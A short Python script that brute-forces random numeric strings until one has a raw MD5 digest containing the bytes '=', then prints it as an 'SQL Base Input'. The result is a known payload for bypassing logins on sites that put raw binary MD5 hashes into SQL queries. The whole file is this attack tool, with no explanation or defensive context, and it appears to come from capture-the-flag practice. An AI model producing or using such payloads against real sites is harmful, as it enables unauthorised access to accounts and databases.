from pymd5 import md5
import sys, random, re

while(1):
    maxint = sys.maxsize
    stringForTest = ""
    firstAttempt = random.randint(0, maxint)
    secondAttempt = random.randint(0, maxint)
    thirdAttempt = random.randint(0, maxint)
    stringForTest = md5(str(firstAttempt)+str(secondAttempt)+str(thirdAttempt)).digest()
    matchResult = re.search(b"'='", stringForTest)

    if matchResult:
        print ("SQL Base Input:\t", str(firstAttempt)+str(secondAttempt)+str(thirdAttempt))
        print("MD5 Hash Key :\t",stringForTest)
        break
